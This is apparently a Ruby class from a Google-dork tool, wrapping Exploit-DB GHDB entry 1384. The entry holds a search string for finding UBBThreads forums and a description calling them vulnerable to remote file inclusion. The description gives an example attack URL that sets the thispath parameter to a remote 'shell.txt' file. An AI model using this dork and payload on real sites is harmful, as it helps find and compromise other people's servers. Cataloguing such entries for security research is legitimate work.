module Dorks
   class Dork1384 < Vulpes::Dork

      def initialize
         super({
            name: "Dork 1384",
            ghdb_url: "https://www.exploit-db.com/ghdb/1384",
            severity: "5",
            category: "advisories_and_vulnerabilities",
            publish_date: "2006-06-02",
            author: "anonymous",
            dork: <<~EDORK,
"powered by ubbthreads"
EDORK
            description: <<~EDESC
forums powered by ubbthreads are vulnerable to file inclusion.You can get more results with yahoo search.http://site.com/ubbthredspath//ubbt.inc.php?thispath=http://shell.txt?http://www.securityfocus.com/archive/1/archive/1/435288/100/0/threaded
EDESC
         })

      end
   end
end
